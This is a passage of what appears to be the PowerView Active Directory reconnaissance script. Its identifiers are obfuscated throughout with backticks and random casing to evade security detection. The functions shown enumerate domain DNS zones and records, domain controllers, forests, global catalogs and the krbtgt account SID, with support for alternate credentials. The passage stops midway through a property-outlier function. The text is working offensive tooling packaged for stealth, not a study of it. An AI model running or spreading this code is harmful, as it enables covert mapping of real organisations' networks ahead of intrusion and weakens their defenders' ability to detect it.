                ${d`OmAi`NObjecT} = N`ew-OBJe`CT Di`ReCTO`Rys`eRVI`cES.diRectOR`YEntry(${S`EArC`HStRIng}, ${cre`de`N`TiaL}.UserName, ${c`Red`entI`Al}.GetNetworkCredential().Password)
                ${SE`ArcHEr} = NEW`-obJe`CT sYsteM`.`DIR`eCtOr`ySeRv`ic`Es.Dir`eC`Tor`ysEAR`cher(${do`Mai`NObjE`ct})
            }
            else {
                
                ${S`earCh`er} = NEW-o`Bj`e`cT sy`SteM.DI`R`e`C`To`RYSeRVI`ce`s.`D`i`RE`CTOrYSeaRcheR([ADSI]${sea`RchSTRi`NG})
            }

            ${se`A`RCH`ER}.PageSize = ${resU`L`T`pagEsiZE}
            ${seA`RCh`Er}.SearchScope = ${SearCH`s`CoPe}
            ${S`E`ARCher}.CacheResults = ${fal`se}
            ${se`ARc`Her}.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

            if (${P`s`BOuNDpa`RaMeters}['ServerTimeLimit']) {
                ${SEA`RCher}.ServerTimeLimit = ${SE`R`VE`R`TIMeLimIt}
            }

            if (${ps`BO`UNDPAR`AMeTErs}['Tombstone']) {
                ${S`ear`ChEr}.Tombstone = ${Tr`Ue}
            }

            if (${psBoUN`dPAra`mE`T`E`RS}['LDAPFilter']) {
                ${seA`R`Cher}.filter = ${lDa`Pfi`lt`ER}
            }

            if (${ps`BOU`N`DParaMEters}['SecurityMasks']) {
                ${SEA`RC`hER}.SecurityMasks = Switch (${secuRI`TyM`As`kS}) {
                    'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                    'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                    'None' { [System.DirectoryServices.SecurityMasks]::None }
                    'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                    'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
                }
            }

            if (${p`sbou`NdpAR`A`mEte`Rs}['Properties']) {
                
                ${PR`OpERt`ieSTO`loAD} = ${pRO`p`ertIEs}| fO`R`EaC`h-ObJ`ect { ${_}.Split(',') }
                ${n`ULl} = ${sEARc`H`eR}.PropertiesToLoad.AddRange((${P`Rop`ERt`I`EsTOlOad}))
            }
        }

        ${s`eARc`hER}
    }
}


function cON`VeRt-DNs`R`ECORD {


    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = ${TR`UE}, ValueFromPipelineByPropertyName = ${t`Rue})]
        [Byte[]]
        ${d`NSr`Eco`RD}
    )

    BEGIN {
        function GET-`N`AME {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${R`AW}
            )

            [Int]${len`gth} = ${r`Aw}[0]
            [Int]${sEGme`N`TS} = ${r`AW}[1]
            [Int]${INd`eX} =  2
            [String]${na`me}  = ''

            while (${Se`GmEN`Ts}-- -gt 0)
            {
                [Int]${SeG`M`e`NTLeNgTH} = ${r`Aw}[${I`NDeX}++]
                while (${SegmEN`T`lEn`G`Th}-- -gt 0) {
                    ${na`me} += [Char]${r`AW}[${IND`ex}++]
                }
                ${NA`ME} += "."
            }
            ${N`AmE}
        }
    }

    PROCESS {
        
        ${R`DaTAtY`Pe} = [BitConverter]::ToUInt16(${d`NsR`e`corD}, 2)
        ${U`PDaT`eDaTSeR`I`Al} = [BitConverter]::ToUInt32(${D`N`SREC`orD}, 8)

        ${TT`Lraw} = ${DnSrE`cO`RD}[12..15]

        
        ${N`Ull} = [array]::Reverse(${tt`L`RAw})
        ${t`TL} = [BitConverter]::ToUInt32(${tt`lraW}, 0)

        ${A`gE} = [BitConverter]::ToUInt32(${DN`sR`ECoRd}, 20)
        if (${A`ge} -ne 0) {
            ${TIM`eSta`MP} = ((GE`T-`DATE -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours(${a`gE})).ToString()
        }
        else {
            ${TI`m`E`Stamp} = '[static]'
        }

        ${d`N`SrE`CORDoB`jeCT} = nEW-`OB`JEct PSOB`J`Ect

        if (${rD`ATAT`yPe} -eq 1) {
            ${I`p} = "{0}.{1}.{2}.{3}" -f ${d`N`sRecORd}[24], ${dnSr`eC`O`Rd}[25], ${dN`sre`corD}[26], ${dN`S`ReCOrd}[27]
            ${da`Ta} = ${iP}
            ${Dn`S`RecoRDOb`J`ecT} | add`-ME`MbEr n`OTepR`oPeR`TY 'RecordType' 'A'
        }

        elseif (${rDAt`ATY`pe} -eq 2) {
            ${nsN`AMe} = gEt-N`AmE ${DNSRe`cO`RD}[24..${Dn`s`ReCORD}.length]
            ${dA`Ta} = ${nsna`ME}
            ${dNsRECO`RDO`BJ`eCT} | AdD-M`EMB`er nO`TepRO`peRty 'RecordType' 'NS'
        }

        elseif (${RdATaT`Y`pE} -eq 5) {
            ${a`lias} = gE`T-n`AMe ${D`NSReco`RD}[24..${D`N`sRECoRd}.length]
            ${d`AtA} = ${A`lias}
            ${dNSr`ECoRDOBJ`E`Ct} | ad`d-meMb`ER NoTe`pR`OpErTY 'RecordType' 'CNAME'
        }

        elseif (${rd`AtatY`Pe} -eq 6) {
            
            ${D`ATA} = $([System.Convert]::ToBase64String(${D`NsReco`Rd}[24..${DN`S`REco`Rd}.length]))
            ${dNsrE`COr`do`BJECT} | a`dd`-MEmBer n`OTeP`R`OPerTY 'RecordType' 'SOA'
        }

        elseif (${R`dAtaT`Ype} -eq 12) {
            ${p`Tr} = gE`T-n`AME ${dN`sr`eCoRD}[24..${d`Nsr`ec`ord}.length]
            ${D`Ata} = ${P`TR}
            ${DNsREC`OR`d`oBJ`ecT} | A`Dd-MemB`er NOTe`p`ROPE`RTY 'RecordType' 'PTR'
        }

        elseif (${r`daTa`Ty`Pe} -eq 13) {
            
            ${d`ATA} = $([System.Convert]::ToBase64String(${D`NsrecO`Rd}[24..${DnSRE`C`Ord}.length]))
            ${dNs`Re`C`OR`d`oBjeCT} | A`Dd-`meMBeR nOTe`prO`P`ErTY 'RecordType' 'HINFO'
        }

        elseif (${Rd`A`TaTyPe} -eq 15) {
            
            ${DA`TA} = $([System.Convert]::ToBase64String(${DNSR`E`C`Ord}[24..${d`N`SRecoRD}.length]))
            ${Dn`S`R`E`cOR`DOBJEct} | ad`d-meM`BeR NO`Te`ProP`ERTY 'RecordType' 'MX'
        }

        elseif (${RdAt`AT`YPE} -eq 16) {
            [string]${T`xT}  = ''
            [int]${s`Eg`mE`NtL`enGth} = ${DnS`R`e`cORD}[24]
            ${InD`eX} = 25

            while (${Seg`Men`T`lEn`gTH}-- -gt 0) {
                ${T`Xt} += [char]${d`NSRecO`RD}[${i`N`DEx}++]
            }

            ${da`TA} = ${t`xt}
            ${DNSRe`cO`RDOBJe`CT} | Add`-MEmb`eR nO`T`EPROPERty 'RecordType' 'TXT'
        }

        elseif (${RD`ATaT`ypE} -eq 28) {
            
            ${d`ATA} = $([System.Convert]::ToBase64String(${DNSre`co`RD}[24..${dns`RECO`RD}.length]))
            ${d`Nsr`ECOr`dobJE`cT} | aDd-me`mb`ER NoTEPr`OPe`RtY 'RecordType' 'AAAA'
        }

        elseif (${Rd`AtAT`YpE} -eq 33) {
            
            ${Da`Ta} = $([System.Convert]::ToBase64String(${D`Nsr`EC`ORd}[24..${d`NsreC`OrD}.length]))
            ${D`Ns`RE`c`OrdOBjecT} | A`D`D-Me`mBER No`TepRO`pERTY 'RecordType' 'SRV'
        }

        else {
            ${d`ATa} = $([System.Convert]::ToBase64String(${dnsRe`C`o`RD}[24..${dN`sr`ecord}.length]))
            ${DNSR`eCo`R`D`O`BjECt} | ADd`-m`eM`BeR not`EPr`Op`eRtY 'RecordType' 'UNKNOWN'
        }

        ${DN`sREcord`oBje`Ct} | AdD`-`membeR noTeprop`er`Ty 'UpdatedAtSerial' ${uP`d`AtEDaT`S`eRIaL}
        ${D`NS`RecoRDOBJ`EcT} | a`dd-`MemBEr n`Ot`E`PrOpErty 'TTL' ${t`Tl}
        ${dNsr`EcoR`D`obJ`Ect} | ADD-`M`E`MbeR NOtEPr`o`pE`RTY 'Age' ${a`GE}
        ${dNs`REcOrd`oB`JE`cT} | a`d`D-mEm`Ber NO`TePr`OpeR`TY 'TimeStamp' ${TI`mEsT`AmP}
        ${d`N`SreC`ORdo`BjEct} | ADd-mE`M`BER n`OTEprOP`ErTy 'Data' ${d`AtA}
        ${d`NSreCo`RDobj`eCT}
    }
}


function G`e`T-d`OmAINDnsZ`O`Ne {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Dom`A`In},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${S`eRv`ER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PR`OpERti`Es},

        [ValidateRange(1, 10000)]
        [Int]
        ${r`ESult`paGe`SIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRveR`TimE`LI`M`IT},

        [Alias('ReturnOne')]
        [Switch]
        ${f`i`NDonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`e`DEntIaL} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ${s`EaRCHER`A`R`GUmEnTs} = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if (${psb`Ou`N`dp`AraMEteRS}['Domain']) { ${sear`Che`RA`R`GU`MenTS}['Domain'] = ${do`MaIn} }
        if (${p`sboU`N`DPA`RAMetErs}['Server']) { ${sEar`chErar`GU`MEntS}['Server'] = ${sER`V`eR} }
        if (${PSboU`N`DParA`meTErS}['Properties']) { ${S`EarCh`E`RaRgum`eNtS}['Properties'] = ${PR`O`pERt`IEs} }
        if (${psb`OuNdPAR`A`mE`TeRs}['ResultPageSize']) { ${sE`ARcheR`Arg`UmenTS}['ResultPageSize'] = ${Resu`LTPA`ge`siZe} }
        if (${PSBO`U`Nd`Par`AmeteRS}['ServerTimeLimit']) { ${seArch`Er`ArgU`Me`N`Ts}['ServerTimeLimit'] = ${SEr`VeRtIM`e`l`iMit} }
        if (${PsBOUND`ParAm`E`T`eRs}['Credential']) { ${SEAr`c`H`ERARG`UmEN`Ts}['Credential'] = ${cRE`DeNt`i`Al} }
        ${DnsseARCH`e`R1} = Get`-`DOmainsEa`RCHeR @SearcherArguments

        if (${dn`S`SeARc`HEr1}) {
            if (${p`sBO`U`NDPaRA`MEterS}['FindOne']) { ${R`esults} = ${DNSsea`Rc`hE`R1}.FindOne()  }
            else { ${R`ESUlTS} = ${Dns`sea`Rc`HEr1}.FindAll() }
            ${r`e`SuLts} | W`hEr`E-oBjE`ct {${_}} | For`eAcH-o`Bj`e`CT {
                ${o`Ut} = co`NveRt-L`DAPprOPer`TY -Properties ${_}.Properties
                ${o`UT} | AdD`-MEMb`eR NOTEProp`ER`TY 'ZoneName' ${o`Ut}.name
                ${O`UT}.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                ${o`UT}
            }

            if (${re`SULTs}) {
                try { ${rEsU`L`TS}.dispose() }
                catch {
                    w`R`iTE-VeRBOse "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                }
            }
            ${dNSSeArch`E`R1}.dispose()
        }

        ${sea`Rche`Rarg`U`Men`Ts}['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        ${DNSsEAr`cH`E`R2} = ge`T-`doMaIn`SeARchER @SearcherArguments

        if (${DNs`sEAR`C`he`R2}) {
            try {
                if (${Ps`B`ouNdp`ARAmEt`eRs}['FindOne']) { ${RESu`l`TS} = ${Dn`SSEARc`heR2}.FindOne() }
                else { ${re`SUlts} = ${DNsS`eaRch`E`R2}.FindAll() }
                ${re`S`ULts} | W`h`ER`e-obJeCt {${_}} | ForE`Ac`H-OBjECt {
                    ${o`Ut} = cO`N`VeRT`-l`DaPp`RoP`ERTy -Properties ${_}.Properties
                    ${O`UT} | ad`D-m`eMBER NOTepro`p`ERTy 'ZoneName' ${O`Ut}.name
                    ${O`Ut}.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    ${O`UT}
                }
                if (${Re`S`ULTS}) {
                    try { ${rE`Sul`Ts}.dispose() }
                    catch {
                        WRitE-`V`e`Rb`OsE "[Get-DomainDNSZone] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                wRiTe-`VERBo`sE "[Get-DomainDNSZone] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            ${dns`SEA`RChER2}.dispose()
        }
    }
}


function Ge`T-DOm`A`iNDNSrEC`oRD {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = ${t`RUe}, ValueFromPipeline = ${tR`UE}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${zo`Nena`me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`m`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${S`ervER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pro`PER`Ties} = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',

        [ValidateRange(1, 10000)]
        [Int]
        ${REsUl`TP`AgE`siZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRve`R`TI`m`elIm`IT},

        [Alias('ReturnOne')]
        [Switch]
        ${f`iNDone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Re`DEntI`Al} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ${s`eAR`c`herargum`e`NtS} = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if (${PsBoun`Dp`ArA`mETE`RS}['Domain']) { ${SEa`RCherArgU`Me`Nts}['Domain'] = ${D`Om`AIN} }
        if (${pSbO`UNDpa`Ra`metERs}['Server']) { ${s`E`ARCh`e`RargumeNtS}['Server'] = ${s`e`RVER} }
        if (${PSBo`UnDp`A`RaM`eTe`RS}['Properties']) { ${S`Ear`cHeR`ARgUmenTs}['Properties'] = ${PrO`PE`R`TIes} }
        if (${pS`BOun`dpar`AMETe`Rs}['ResultPageSize']) { ${SEA`R`CHeRA`R`GUmeNTS}['ResultPageSize'] = ${r`es`UlTpagEs`IzE} }
        if (${PsBOu`ND`PaRAMeT`ERS}['ServerTimeLimit']) { ${s`EaRchERA`Rgu`MEn`Ts}['ServerTimeLimit'] = ${s`ERVE`RT`iMELIM`It} }
        if (${Ps`BOuND`pAra`mET`ers}['Credential']) { ${s`E`A`RCHE`RargumE`NTS}['Credential'] = ${CRE`d`ential} }
        ${DNsSe`ARCH`er} = g`eT`-DoMa`insEaRChEr @SearcherArguments

        if (${Dn`s`SEarch`Er}) {
            if (${P`SboUnDpARaM`E`TerS}['FindOne']) { ${R`eSuL`Ts} = ${dNS`Se`ArchER}.FindOne() }
            else { ${rE`Sul`TS} = ${Dn`sSeAR`Ch`Er}.FindAll() }
            ${r`e`SUltS} | wh`e`RE-o`BjECt {${_}} | for`EA`C`H-OBjEcT {
                try {
                    ${o`Ut} = cOnvE`RT-lDapp`R`OP`erTy -Properties ${_}.Properties | S`elEcT`-obJECT n`AME,D`isTiNguIs`heDn`AmE,D`NSr`eCOrd,W`hE`NcRE`ATED,whenCH`A`NgeD
                    ${O`UT} | ADD-`mEM`BER not`ep`R`oPerTY 'ZoneName' ${zO`NENa`mE}

                    
                    if (${O`Ut}.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        
                        ${Re`co`Rd} = c`OnVErt`-D`NSRe`CORd -DNSRecord ${O`Ut}.dnsrecord[0]
                    }
                    else {
                        ${r`EC`oRd} = COn`Ve`RT-DNsr`eC`oRd -DNSRecord ${o`UT}.dnsrecord
                    }

                    if (${reC`o`Rd}) {
                        ${rEc`o`RD}.PSObject.Properties | F`OREAch-oB`j`E`cT {
                            ${o`Ut} | aD`D-`MEMb`Er nOte`p`RO`peRtY ${_}.Name ${_}.Value
                        }
                    }

                    ${O`UT}.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    ${O`UT}
                }
                catch {
                    WRItE`-WaRn`I`NG "[Get-DomainDNSRecord] Error: $_"
                    ${o`Ut}
                }
            }

            if (${REsu`L`Ts}) {
                try { ${R`esu`Lts}.dispose() }
                catch {
                    WrItE`-`V`eRBOsE "[Get-DomainDNSRecord] Error disposing of the Results object: $_"
                }
            }
            ${D`Nsse`ARC`Her}.dispose()
        }
    }
}


function GEt`-Do`maIN {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OmAIn},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRE`den`TIAl} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if (${P`s`BOUnDp`ArAMEtERS}['Credential']) {

            wR`iTe-`Ve`RbO`se '[Get-Domain] Using alternate credentials for Get-Domain'

            if (${pS`BouNDP`A`RaMETe`RS}['Domain']) {
                ${tA`Rge`TdoMaIn} = ${Do`m`Ain}
            }
            else {
                
                ${t`AR`getdOm`A`iN} = ${Cred`en`TI`AL}.GetNetworkCredential().Domain
                wriTE-vE`R`BOSe "[Get-Domain] Extracted domain '$TargetDomain' from -Credential"
            }

            ${DOm`AIn`cOnTEXT} = new`-O`BjEcT SYSTEM`.DIr`ecTOr`ySErVIcEs.ACt`iVE`DIrecToR`Y.DI`R`E`ctOR`ycON`TeXt('Domain', ${Ta`Rg`eT`DoMaiN}, ${crE`DE`NTIaL}.UserName, ${C`R`eDE`NtiAl}.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${dO`m`AIncon`TeXt})
            }
            catch {
                wRi`Te`-`VERbOSe "[Get-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif (${Ps`BOuN`D`p`ARAMETERS}['Domain']) {
            ${dO`m`Ai`NCON`TEXt} = N`EW-`oBjECT SYSTEM.`d`iR`eC`TOrYsErVI`CEs.aCt`ived`I`Rectory.`Di`REc`T`OryCoN`TEXT('Domain', ${dOma`iN})
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${DOM`AinC`OnText})
            }
            catch {
                w`Rite-`V`ERbo`se "[Get-Domain] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                wRI`T`e-VErboSE "[Get-Domain] Error retrieving the current domain: $_"
            }
        }
    }
}


function Ge`T-d`oM`AInConTrolleR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RuE})]
        [String]
        ${d`oMaIn},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`erV`Er},

        [Switch]
        ${l`dAP},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrE`dEN`T`iaL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${s`SL}
    )

    PROCESS {
        ${ArGU`ME`N`Ts} = @{}
        if (${PSbou`Nd`pAR`A`mETers}['Domain']) { ${arGU`mE`NtS}['Domain'] = ${D`oM`Ain} }
        if (${P`SBO`U`Nd`PARAmEteRS}['Credential']) { ${ARguM`E`N`TS}['Credential'] = ${CrEde`NT`ial} }
        if (${pSbo`U`NDP`AraMeT`Ers}['SSL']) { ${a`Rgum`enTS}['SSL'] = ${s`sL} }

        if (${psB`o`UN`dpArAme`TeRs}['LDAP'] -or ${Psbou`NdPa`Ra`M`et`Ers}['Server']) {
            if (${P`SbOUn`d`pAR`AmeTe`RS}['Server']) { ${Ar`gUMe`Nts}['Server'] = ${SER`VER} }

            
            ${A`RGU`mENTs}['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'

            Get-dOM`Ai`NCo`MPU`Ter @Arguments
        }
        else {
            ${fOUn`d`D`OmaIn} = GEt-`Doma`in @Arguments
            if (${f`OUNDD`oMA`iN}) {
                ${fOuN`dDom`AIn}.DomainControllers
            }
        }
    }
}


function g`E`T-`ForEst {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${For`EsT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`eDen`TI`AL} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if (${P`SB`OUNdPAR`AMeT`ers}['Credential']) {

            W`RI`Te-VeRBO`Se "[Get-Forest] Using alternate credentials for Get-Forest"

            if (${PSBOund`p`ARaMetE`RS}['Forest']) {
                ${T`A`R`geTfORESt} = ${f`or`eST}
            }
            else {
                
                ${TARGeTf`o`RE`St} = ${cReD`EN`Ti`AL}.GetNetworkCredential().Domain
                w`Ri`T`e-VerBOSE "[Get-Forest] Extracted domain '$Forest' from -Credential"
            }

            ${FoRe`stc`o`NTeXt} = N`Ew-`oBJECT Sy`steM.D`IRECt`o`Rys`ER`VICES.A`c`TIVed`iREcTOrY.`dIRECToRyco`NTEXt('Forest', ${targetf`oR`Est}, ${c`R`EdEntIAL}.UserName, ${Cre`de`NT`iAL}.GetNetworkCredential().Password)

            try {
                ${FoRE`sToB`Je`ct} = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(${fO`REST`c`ONTExt})
            }
            catch {
                wrI`T`E-ve`RBose "[Get-Forest] The specified forest '$TargetForest' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                ${n`UlL}
            }
        }
        elseif (${psbOUn`D`Pa`Ra`METERS}['Forest']) {
            ${ForeST`Co`N`TExt} = nEw-ob`je`cT sYst`em.`DiRecT`oRySeRvIceS`.A`cti`VeD`IRecTO`RY.DireC`To`RY`COntExt('Forest', ${f`Or`eSt})
            try {
                ${F`Ores`TOb`JecT} = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(${foR`eSTconT`e`Xt})
            }
            catch {
                wri`Te-V`e`RBO`Se "[Get-Forest] The specified forest '$Forest' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return ${nU`ll}
            }
        }
        else {
            
            ${Fo`ReS`TOb`ject} = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if (${FOrEstOBj`E`Ct}) {
            
            if (${pS`BouND`P`ARaMe`TErs}['Credential']) {
                ${fOR`esT`SId} = (GEt-DOm`AINu`sEr -Identity "krbtgt" -Domain ${For`esT`o`BjeCT}.RootDomain.Name -Credential ${c`R`eDenTIal}).objectsid
            }
            else {
                ${f`Ore`stS`iD} = (gE`T`-`DOMAiNUs`er -Identity "krbtgt" -Domain ${FoR`esTob`j`e`cT}.RootDomain.Name).objectsid
            }

            ${pa`RtS} = ${foR`es`TsID} -Split '-'
            ${Fo`ReS`TSid} = ${Pa`Rts}[0..$(${p`AR`TS}.length-2)] -join '-'
            ${FOrESto`B`jECT} | aDD-m`e`mbeR N`OTe`pRopErTy 'RootDomainSid' ${f`orEsTs`Id}
            ${FOrEs`T`o`BJEcT}
        }
    }
}


function GE`T-FOr`EStDOMA`In {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${fO`ReSt},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`EdE`NTi`AL} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ${arG`Ume`NTS} = @{}
        if (${Ps`BOUNd`pa`RAMEt`eRs}['Forest']) { ${ar`g`U`mENTs}['Forest'] = ${FO`ReST} }
        if (${p`sbOuNDPa`RAMEtE`Rs}['Credential']) { ${a`R`GuMEnTS}['Credential'] = ${cred`ENT`ial} }

        ${FO`Re`stoB`JeCt} = g`eT`-fOresT @Arguments
        if (${ForE`sT`o`BJ`ECT}) {
            ${FO`Re`STObJEct}.Domains
        }
    }
}


function Get-FO`REst`G`LO`B`AlCaTaLog {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${FoR`est},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`e`D`ENTiaL} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ${ar`GUME`NTs} = @{}
        if (${p`SBOuNdpAraMEt`e`RS}['Forest']) { ${AR`g`UMEnTS}['Forest'] = ${F`OResT} }
        if (${PsbOundpaR`A`mETe`Rs}['Credential']) { ${AR`g`UmE`Nts}['Credential'] = ${Cre`D`ENTIaL} }

        ${FORE`stOb`jECT} = ge`T-f`ORe`st @Arguments

        if (${fOResto`Bj`ECt}) {
            ${fo`RES`T`obJeCT}.FindAllGlobalCatalogs()
        }
    }
}


function g`e`T-Fo`Re`StScHeM`AclAss {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RUe})]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cLaSS`N`AMe},

        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f`ore`st},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`EDEnt`IAL} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ${Ar`GUME`NtS} = @{}
        if (${p`sBound`P`ArAmetERS}['Forest']) { ${ArGuM`e`N`Ts}['Forest'] = ${FORE`ST} }
        if (${pSbOundp`ARA`met`ERs}['Credential']) { ${ARgU`MeN`TS}['Credential'] = ${crE`DeNT`IAl} }

        ${F`OREST`ObJ`ECt} = GEt`-`FOResT @Arguments

        if (${F`or`es`TOB`jECT}) {
            if (${pS`BoU`N`DpArAmETeRS}['ClassName']) {
                ForEach (${tAr`Get`CLa`Ss} in ${c`lAsSn`Ame}) {
                    ${Fo`R`Est`ObjEcT}.Schema.FindClass(${TargEt`CL`ASS})
                }
            }
            else {
                ${foREsT`oB`JEct}.Schema.FindAllClasses()
            }
        }
    }
}


function f`iND-DOmaIn`obJECt`pR`oPERTyOUt`lieR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = ${tr`UE}, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        ${ClA`ssna`ME},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${re`F`ErEn`CEP`RopeRTYSET},

        [Parameter(ValueFromPipeline = ${t`RuE}, Mandatory = ${TR`UE}, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        ${R`eFErEnCE`OB`JecT},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dom`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${LdapFI`L`TeR},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${sear`ch`Ba`Se},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sE`RvEr},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${s`ea`RCHSco`PE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${R`eSUlt`pA`G`eSiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`ERvE`RTi`m`Elimit},

        [Switch]
        ${TO`MB`St`one},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`EDent`I`Al} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${use`RRefEreNCe`prOPER`TYS`Et} = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')

